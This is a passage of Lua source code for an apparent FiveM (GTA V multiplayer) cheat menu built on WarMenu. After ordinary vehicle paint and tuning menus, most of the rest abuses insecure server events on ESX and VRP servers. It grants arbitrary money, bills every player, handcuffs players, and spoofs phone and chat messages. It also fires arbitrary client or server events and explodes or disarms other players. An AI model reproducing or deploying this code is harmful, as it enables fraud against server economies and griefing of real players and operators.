							SetVehicleColours(veh,oldprim,thePaint.id)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("classic3") then
				for theName,thePaint in pairs(LSC.paintsClassic) do
					_,ts = GetVehicleExtraColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					_,currims = GetVehicleExtraColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)

							isPreviewing = true
						elseif isPreviewing and currims == thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and currims ~= thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("metallic3") then
				for theName,thePaint in pairs(LSC.paintsClassic) do
					_,ts = GetVehicleExtraColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					_,currims = GetVehicleExtraColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)

							isPreviewing = true
						elseif isPreviewing and currims == thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and currims ~= thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("matte3") then
				for theName,thePaint in pairs(LSC.paintsMatte) do
					_,ts = GetVehicleExtraColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					_,currims = GetVehicleExtraColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)

							isPreviewing = true
						elseif isPreviewing and currims == thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and currims ~= thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("metal3") then
				for theName,thePaint in pairs(LSC.paintsMetal) do
					_,ts = GetVehicleExtraColours(veh)
					if ts == thePaint.id and not isPreviewing then
						pricetext = "~g~Installed"
					else
						if isPreviewing and ts == thePaint.id then
							pricetext = "~y~Previewing"
						else
							pricetext = "Not Installed"
						end
					end
					_,currims = GetVehicleExtraColours(veh)
					if WarMenu.Button(thePaint.name, pricetext) then
						if not isPreviewing then
							oldmodtype = "paint"
							oldmodaction = false
							oldprim,oldsec = GetVehicleColours(veh)
							oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
							oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)

							isPreviewing = true
						elseif isPreviewing and currims == thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif isPreviewing and currims ~= thePaint.id then
							SetVehicleExtraColours(veh, oldpearl,thePaint.id)
							isPreviewing = true
						end
					end
				end
				WarMenu.Display()
			end

			if WarMenu.IsMenuOpened("LSC") then
				if LUX.Player.inVehicle then
					if WarMenu.MenuButton("Visual Tuning", "tunings") then
					elseif WarMenu.MenuButton("Performance Tuning", "performance") then
					end
				else
					if WarMenu.Button("No vehicle found") then
					end
				end

				WarMenu.Display()
			end

			for i,theItem in pairs(LSC.vehicleMods) do

				if WarMenu.IsMenuOpened(41) or WarMenu.IsMenuOpened(39) or WarMenu.IsMenuOpened(40) or WarMenu.IsMenuOpened(45) then
					SetVehicleDoorOpen(veh, 4, false, true)
				elseif WarMenu.IsMenuOpened(38) or WarMenu.IsMenuOpened(37) then
					SetVehicleDoorOpen(veh, 5, false, true)

				elseif WarMenu.IsMenuOpened("tunings") then
					--SetVehicleDoorShut(veh, 4, false)
					--SetVehicleDoorShut(veh, 5, false)
					if isPreviewing then
						if oldmodtype == "neon" then
							local r,g,b = table.unpack(oldmod)
							SetVehicleNeonLightsColour(veh,r,g,b)
							SetVehicleNeonLightEnabled(veh, 0, oldmodaction)
							SetVehicleNeonLightEnabled(veh, 1, oldmodaction)
							SetVehicleNeonLightEnabled(veh, 2, oldmodaction)
							SetVehicleNeonLightEnabled(veh, 3, oldmodaction)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						elseif oldmodtype == "paint" then
							local pa,pb,pc,pd = table.unpack(oldmod)
							SetVehicleColours(veh, pa,pb)
							SetVehicleExtraColours(veh,pc,pd)
							isPreviewing = false
							oldmodtype = -1
							oldmod = -1
						else
							if oldmodaction == "rm" then
								RemoveVehicleMod(veh, oldmodtype)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
							else
								SetVehicleMod(veh, oldmodtype,oldmod,false)
								isPreviewing = false
								oldmodtype = -1
								oldmod = -1
							end
						end
					end
				end

				if WarMenu.IsMenuOpened(theItem.id) then
					if theItem.id == "wheeltypes" then
						if WarMenu.Button("Sport Wheels") then
							SetVehicleWheelType(veh,0)
						elseif WarMenu.Button("Muscle Wheels") then
							SetVehicleWheelType(veh,1)
						elseif WarMenu.Button("Lowrider Wheels") then
							SetVehicleWheelType(veh,2)
						elseif WarMenu.Button("SUV Wheels") then
							SetVehicleWheelType(veh,3)
						elseif WarMenu.Button("Offroad Wheels") then
							SetVehicleWheelType(veh,4)
						elseif WarMenu.Button("Tuner Wheels") then
							SetVehicleWheelType(veh,5)
						elseif WarMenu.Button("High End Wheels") then
							SetVehicleWheelType(veh,7)
						end
						WarMenu.Display()
					elseif theItem.id == "extra" then
						local extras = LSC:CheckValidVehicleExtras()
						for i,theItem in pairs(extras) do
							if IsVehicleExtraTurnedOn(veh,i) then
								pricestring = "~g~Installed"
							else
								pricestring = "Not Installed"
							end

							if WarMenu.Button(theItem.menuName, pricestring) then
								if not IsVehicleExtraTurnedOn(veh, i) then
									local payed = true
									if payed then
										SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh,i))
									end
								else
									SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh,i))
								end
							end
						end
						WarMenu.Display()
					elseif theItem.id == "neon" then

						if WarMenu.Button("None", "Default") then
							SetVehicleNeonLightsColour(veh,255,255,255)
							SetVehicleNeonLightEnabled(veh,0,false)
							SetVehicleNeonLightEnabled(veh,1,false)
							SetVehicleNeonLightEnabled(veh,2,false)
							SetVehicleNeonLightEnabled(veh,3,false)
						end


						for i,theItem in pairs(LSC.neonColors) do
							colorr,colorg,colorb = table.unpack(theItem)
							r,g,b = GetVehicleNeonLightsColour(veh)

							if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(veh,2) and not isPreviewing then
								pricestring = "~g~Installed"
							else
								if isPreviewing and colorr == r and colorg == g and colorb == b then
									pricestring = "~y~Previewing"
								else
									pricestring = "Not Installed"
								end
							end

							if WarMenu.Button(i, pricestring) then
								if not isPreviewing then
									oldmodtype = "neon"
									oldmodaction = IsVehicleNeonLightEnabled(veh,1)
									oldr,oldg,oldb = GetVehicleNeonLightsColour(veh)
									oldmod = table.pack(oldr,oldg,oldb)
									SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
									SetVehicleNeonLightEnabled(veh,0,true)
									SetVehicleNeonLightEnabled(veh,1,true)
									SetVehicleNeonLightEnabled(veh,2,true)
									SetVehicleNeonLightEnabled(veh,3,true)
									isPreviewing = true
								elseif isPreviewing and colorr == r and colorg == g and colorb == b then
									SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
									SetVehicleNeonLightEnabled(veh,0,true)
									SetVehicleNeonLightEnabled(veh,1,true)
									SetVehicleNeonLightEnabled(veh,2,true)
									SetVehicleNeonLightEnabled(veh,3,true)
									isPreviewing = false
									oldmodtype = -1
									oldmod = -1
								elseif isPreviewing and colorr ~= r or colorg ~= g or colorb ~= b then
									SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
									SetVehicleNeonLightEnabled(veh,0,true)
									SetVehicleNeonLightEnabled(veh,1,true)
									SetVehicleNeonLightEnabled(veh,2,true)
									SetVehicleNeonLightEnabled(veh,3,true)
									isPreviewing = true
								end
							end
						end
						WarMenu.Display()
					elseif theItem.id == "paint" then

						if WarMenu.MenuButton("Primary Paint","primary") then

						elseif WarMenu.MenuButton("Secondary Paint","secondary") then

						elseif WarMenu.MenuButton("Wheel Paint","rimpaint") then

						end

						WarMenu.Display()
					else
						local valid = LSC:CheckValidVehicleMods(theItem.id)
						for ci,ctheItem in pairs(valid) do
							for eh,tehEtem in pairs(modPrices) do
								if eh == theItem.name and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
									price = "Not Installed"
									actualprice = tehEtem
								elseif eh == theItem.name and isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
									price = "~y~Previewing"
									actualprice = tehEtem
								elseif eh == theItem.name and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
									price = "~g~Installed"
									actualprice = tehEtem
								end
							end
							if ctheItem.menuName == "Stock" then price = 0 end
							if theItem.name == "Horns" then
								for chorn,HornId in pairs(LSC.horns) do
									if HornId == ci-1 then
										ctheItem.menuName = chorn
									end
								end
							end
							if ctheItem.menuName == "NULL" then
								ctheItem.menuName = "unknown"
							end
							if WarMenu.Button(ctheItem.menuName, price) then





								if not isPreviewing then
									oldmodtype = theItem.id
									oldmod = GetVehicleMod(veh, theItem.id)
									isPreviewing = true
									if ctheItem.data.realIndex == -1 then
										oldmodaction = "rm"
										RemoveVehicleMod(veh, ctheItem.data.modid)
										isPreviewing = false
										oldmodtype = -1
										oldmod = -1
										oldmodaction = false
									else
										oldmodaction = false
										SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
									end
								elseif isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
									isPreviewing = false
									oldmodtype = -1
									oldmod = -1
									oldmodaction = false
									if ctheItem.data.realIndex == -1 then
										RemoveVehicleMod(veh, ctheItem.data.modid)
									else
										SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
									end
								elseif isPreviewing and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
									if ctheItem.data.realIndex == -1 then
										RemoveVehicleMod(veh, ctheItem.data.modid)
										isPreviewing = false
										oldmodtype = -1
										oldmod = -1
										oldmodaction = false
									else
										SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
										isPreviewing = true
									end
								end
							end
						end
						WarMenu.Display()
					end
				end
			end

			for i,theItem in pairs(LSC.perfMods) do
				if GetVehicleMod(veh,theItem.id) == 0 then
					pricestock = "Default"
					price1 = "~g~Installed"
					price2 = "Not Installed"
					price3 = "Not Installed"
					price4 = "Not Installed"
				elseif GetVehicleMod(veh,theItem.id) == 1 then
					pricestock = "Default"
					price1 = "Not Installed"
					price2 = "~g~Installed"
					price3 = "Not Installed"
					price4 = "Not Installed"
				elseif GetVehicleMod(veh,theItem.id) == 2 then
					pricestock = "Default"
					price1 = "Not Installed"
					price2 = "Not Installed"
					price3 = "~g~Installed"
					price4 = "Not Installed"
				elseif GetVehicleMod(veh,theItem.id) == 3 then
					pricestock = "Default"
					price1 = "Not Installed"
					price2 = "Not Installed"
					price3 = "Not Installed"
					price4 = "~g~Installed"
				elseif GetVehicleMod(veh,theItem.id) == -1 then
					pricestock = "~g~Installed"
					price1 = "Not Installed"
					price2 = "Not Installed"
					price3 = "Not Installed"
					price4 = "Not Installed"
				end
				if WarMenu.IsMenuOpened(theItem.id) then

					if WarMenu.Button("Stock "..theItem.name, pricestock) then
						SetVehicleModKit(veh, 0)
						SetVehicleMod(veh, theItem.id, -1, false)
						print ("applied -1")
					elseif WarMenu.Button(theItem.name.." Upgrade 1", price1) then
						SetVehicleModKit(veh, 0)
						SetVehicleMod(veh, theItem.id, 0, false)
						print ("applied 0")
					elseif WarMenu.Button(theItem.name.." Upgrade 2", price2) then
						SetVehicleModKit(veh, 0)
						SetVehicleMod(veh, theItem.id, 1, false)
						print ("applied 1")
					elseif WarMenu.Button(theItem.name.." Upgrade 3", price3) then
						SetVehicleModKit(veh, 0)
						SetVehicleMod(veh, theItem.id, 2, false)
						print ("applied 2")
					elseif theItem.id ~= 13 and theItem.id ~= 12 and WarMenu.Button(theItem.name.." Upgrade 4", price4) then
						SetVehicleModKit(veh, 0)
						SetVehicleMod(veh, theItem.id, 3, false)
						print ("applied 3")
					end
					WarMenu.Display()
				end
			end

			if WarMenu.IsMenuOpened("ServerMenu") then

				if WarMenu.MenuButton("Resource List", "ServerResources") then end
				if WarMenu.MenuButton("ESX Boss Options", "ESXBoss") then end
				if WarMenu.MenuButton("ESX Money Options", "ESXMoney") then end
				if WarMenu.MenuButton("ESX Misc Options", "ESXMisc") then end
				if WarMenu.MenuButton("ESX Drug Options", "ESXDrugs") then end
				if WarMenu.MenuButton("VRP Options", "VRPOptions") then end
				if WarMenu.MenuButton("Misc Options", "MiscServerOptions") then end

				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("MenuSettings") then

				if WarMenu.MenuButton("Change Color Theme", "MenuSettingsColor") then
				elseif WarMenu.Button("~r~Kill Menu") then
					isMenuEnabled = false
				end
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("MenuSettingsColor") then
				if WarMenu.Button("Menu Color: ~r~Red") then
					_menuColor.base = colorRed
				end
				if WarMenu.Button("Menu Color: ~g~Green") then
					_menuColor.base = colorGreen
				end
				if WarMenu.Button("Menu Color: ~b~Blue") then
					_menuColor.base = colorBlue
				end
				if WarMenu.Button("Menu Color: ~p~Purple") then
					_menuColor.base = colorPurple
				end

				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("ServerResources") then
				for _, resource in pairs(validResources) do
					if WarMenu.MenuButton(resource, 'ResourceData') then
						SelectedResource = resource
					end
				end
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened('ResourceData') then
				WarMenu.SetSubTitle('ResourceData', SelectedResource .. " > Data")
				if WarMenu.MenuButton('Event Handlers', 'ResourceCEvents') then end
				if WarMenu.MenuButton('Server Events', 'ResourceSEvents') then end
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened('ResourceCEvents') then
				WarMenu.SetSubTitle('ResourceCEvents', SelectedResource .. " > Data > Event Handlers")
				for key, name in pairs(validResourceEvents[SelectedResource]) do
					if WarMenu.Button(name) then
						print(key)
					end
				end
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened('ResourceSEvents') then
				WarMenu.SetSubTitle('ResourceSEvents', SelectedResource .. " > Data > Server Events")
				for name, payload in pairs(validResourceServerEvents[SelectedResource]) do
					if WarMenu.Button(name) then
						print(payload)
					end
				end
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("ESXBoss") then

				if WarMenu.Button("~c~Mechanic~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","mecano",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~b~Police~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","police",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~r~Ambulance~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","ambulance",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~y~Taxi~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","taxi",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~g~Real Estate~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","realestateagent",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~p~Gang~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","gang",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~o~Car Dealer~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","cardealer",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif WarMenu.Button("~y~Banker~s~ Boss Menu") then
					TriggerEvent("esx_society:openBossMenu","banker",function(data, menu)menu.close() end)
					setMenuVisible(currentMenu, false)
				end

				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("ESXMoney") then

				if WarMenu.Button("~g~ESX ~y~Caution Give Back") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
					if result then
						TriggerServerEvent('esx_jobs:caution', 'give_back', result, 0, 0)
					end
				elseif WarMenu.Button("~g~ESX ~y~TruckerJob Pay") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
					if result then
						TriggerServerEvent('esx_truckerjob:pay', result)
					end
				elseif WarMenu.Button("~g~ESX ~y~Admin Give Bank") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
					if result then
						TriggerServerEvent('AdminMenu:giveBank', result)
					end
				elseif WarMenu.Button("~g~ESX ~y~Admin Give Cash") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
					if result then
						TriggerServerEvent('AdminMenu:giveCash', result)
					end
				elseif WarMenu.Button("~g~ESX ~y~GOPostalJob Pay") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
					if result then
						TriggerServerEvent("esx_gopostaljob:pay", result)
					end
				elseif WarMenu.Button("~g~ESX ~y~BankerJob Pay") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
					if result then
						TriggerServerEvent("esx_banksecurity:pay", result)
					end
				elseif WarMenu.Button("~g~ESX ~y~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100000000)
					if result then
						TriggerServerEvent("esx_slotmachine:sv:2", result)
					end
				end

				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("ESXMisc") then

				if WarMenu.Button("~w~Set hunger to ~g~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif WarMenu.Button("~w~Set thirst to ~g~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif WarMenu.Button("~g~ESX ~y~Revive ID") then
					local id = KeyboardInput("Enter Player ID", "", 1000)
					if id then
						TriggerServerEvent("esx_ambulancejob:revive", GetPlayerServerId(id))
						TriggerServerEvent("whoapd:revive", GetPlayerServerId(id))
						TriggerServerEvent("paramedic:revive", GetPlayerServerId(id))
						TriggerServerEvent("ems:revive", GetPlayerServerId(id))
					end
				elseif WarMenu.Button("~g~ESX ~r~SEND EVERYONE A BILL") then
		        	local amount = KeyboardInput("Enter Amount", "", 100000000)
          			local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
          			if amount and name then
            			for i = 0, 256 do
              				TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
            			end
					end
				elseif WarMenu.Button("~g~ESX ~b~Handcuff ID") then
					local id = KeyboardInput("Enter Player ID", "", 3)
					if id then
						TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(id))
					end
				elseif WarMenu.Button("~g~ESX ~w~Get all licenses") then
					TriggerServerEvent('esx_dmvschool:addLicense', dmv)
					TriggerServerEvent('esx_dmvschool:addLicense', drive)
					TriggerServerEvent('esx_dmvschool:addLicense', drive_bike)
					TriggerServerEvent('esx_dmvschool:addLicense', drive_truck)
				end

				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("MiscServerOptions") then

				if WarMenu.Button("Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification({text = "Sent message:~n~" .. Message .. "", type = "success"})
				elseif WarMenu.Button("Trigger Event") then
					local _eventType = KeyboardInput("Enter event type (Client/Server)", "", 10)
					local eventType = string.lower(_eventType)

					local eventName = KeyboardInput("Enter event name", "", 25)
					local eventArg = KeyboardInput("Enter event argument (Only one argument is supported)", "", 25)
					if eventType == "client" then
						TriggerEvent(eventName, eventArg)
					elseif eventType == "server" then
						TriggerServerEvent(eventName, eventArg)
					end
				elseif WarMenu.Button("Send ambulance alert on waypoint") then
					local playerPed = PlayerPedId()
					if DoesBlipExist(GetFirstBlipInfoId(8)) then
						local blipIterator = GetBlipInfoIdIterator(8)
						local blip = GetFirstBlipInfoId(8, blipIterator)
						WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) --Thanks To Briglair [forum.FiveM.net]
						TriggerServerEvent('esx_addons_gcphone:startCall', 'ambulance', "medical attention required: unconscious citizen!", WaypointCoords)
						drawNotification("~g~Ambulance alert sent to waypoint!")
					else
						drawNotification("~r~No waypoint set!")
					end

				elseif WarMenu.Button("~g~gcPhone ~w~Spoof message") then
					local transmitter = KeyboardInput("Enter transmitting phone number", "", 10)
					local receiver = KeyboardInput("Enter receiving phone number", "", 10)
					local message = KeyboardInput("Enter message to send", "", 100)
					if transmitter then
						if receiver then
							if message then
								TriggerServerEvent('gcPhone:_internalAddMessage', transmitter, receiver, message, 0)
							else
								drawNotification("~r~You must specify a message.")
							end
						else
							drawNotification("~r~You must specify a receiving number.")
						end
					else
						drawNotification("~r~You must specify a transmitting number.")
					end
				elseif WarMenu.Button("Spoof Chat Message") then
					local name = KeyboardInput("Enter chat sender name", "", 15)
					local message = KeyboardInput("Enter your message to send", "", 70)
					if name and message then
						TriggerEvent('chat:addMessage', -1, { args = { name, message }, color = { 255, 255, 255 } })
					end
				elseif WarMenu.Button("~g~MUG ~w~Give item") then
					local itemName = KeyboardInput("Enter item name", "", 20)
					if itemName then
						TriggerServerEvent('esx_mugging:giveItems', (itemName))
						drawNotification("Successfully given item ~g~" .. itemName)
					else
						drawNotification("~r~You must specify an item")
					end
				end

				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("VRPOptions") then

				if WarMenu.Button("~r~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end
				elseif WarMenu.Button("~r~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif WarMenu.Button("~r~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif WarMenu.Button("~r~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
						TriggerServerEvent("bank:deposit", result)
					end
				elseif WarMenu.Button("~r~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
						TriggerServerEvent("bank:withdraw", result)
					end
				end

				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("ESXDrugs") then

				if WarMenu.Button("~g~Harvest ~g~Weed") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
				elseif WarMenu.Button("~g~Transform ~g~Weed ") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
				elseif WarMenu.Button("~g~Sell ~g~Weed") then
					TriggerServerEvent("esx_drugs:startSellWeed")
				elseif WarMenu.Button("~w~Harvest ~w~Coke") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				elseif WarMenu.Button("~w~Transform ~w~Coke") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
				elseif WarMenu.Button("~w~Sell ~w~Coke") then
					TriggerServerEvent("esx_drugs:startSellCoke")
				elseif WarMenu.Button("~r~Harvest Meth") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
				elseif WarMenu.Button("~r~Transform Meth") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
				elseif WarMenu.Button("~r~Sell Meth") then
					TriggerServerEvent("esx_drugs:startSellMeth")
				elseif WarMenu.Button("~p~Harvest Opium") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
				elseif WarMenu.Button("~p~Transform Opium") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
				elseif WarMenu.Button("~p~Sell Opium") then
					TriggerServerEvent("esx_drugs:startSellOpium")
				elseif WarMenu.Button("~g~Money Wash") then
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif WarMenu.Button("~r~Stop all ~c~Drugs") then
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					drawNotification("~r~Everything is now stopped")
				elseif WarMenu.CheckBox("~r~Blow Drugs Up",
					BlowDrugsUp,
					function(enabled)
						BlowDrugsUp = enabled
					end)
				then
				end

				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("OnlinePlayersMenu") then
				onlinePlayerSelected = {}
				
				for _, i in ipairs(GetActivePlayers()) do

					onlinePlayerSelected[#onlinePlayerSelected + 1] = i -- equivalent to table.insert(table, value) but faster

					if WarMenu.MenuButton("~b~" .. GetPlayerServerId(i) .. "~w~   " .. GetPlayerName(i), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end

				index = menus[currentMenu].currentOption
				WarMenu.PopupWindow(onlinePlayerSelected[index])
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("PlayerOptionsMenu") then
				WarMenu.SetSubTitle("PlayerOptionsMenu", "Player Options [" .. GetPlayerName(SelectedPlayer) .. "]")

				if WarMenu.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
					SpectatePlayer(SelectedPlayer)
				end

				if WarMenu.Button("Teleport To Player") then
					LUX.Game:TeleportToPlayer(SelectedPlayer)
				end

				if WarMenu.MenuButton("Weapon Menu", "OnlineWepMenu") then end
				if WarMenu.MenuButton("Vehicle Menu", "OnlineVehicleMenuPlayer") then end
				if WarMenu.MenuButton("~b~ESX Options", "ESXMenuPlayer") then end
				if WarMenu.Button("~r~Silent Explode") then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
				end
				if WarMenu.Button("~y~Explode") then
					AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, true, false, 100000.0)
				end
				if WarMenu.Button("Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, false)
					end
				end
				if WarMenu.Button("Remove All Weapons") then
					RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
				end

				WarMenu.PopupWindow(SelectedPlayer)
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("ESXMenuPlayer") then
				if WarMenu.Button("~g~ESX ~s~Send Bill") then
					local amount = KeyboardInput("Enter Amount", "", 10)
					local name = KeyboardInput("Enter the name of the Bill", "", 25)
					if amount and name then
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(SelectedPlayer), "Purposeless", name, amount)
					end
				elseif WarMenu.Button("~g~ESX ~s~Handcuff Player") then
					TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
				elseif WarMenu.Button("~g~ESX ~s~Revive player") then
					TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
				elseif WarMenu.Button("~g~ESX ~s~Unjail player") then
					TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
					TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))
				end

				WarMenu.PopupWindow(SelectedPlayer)
				WarMenu.Display()
			end
			if WarMenu.IsMenuOpened("OnlineWepMenu") then
				WarMenu.SetSubTitle("OnlineWepMenu", "Weapon Options - " .. GetPlayerName(SelectedPlayer) .. "")
				WarMenu.MenuButton("Give Weapon", "OnlineWepCategory")

				WarMenu.PopupWindow(SelectedPlayer)
				WarMenu.Display()
			end
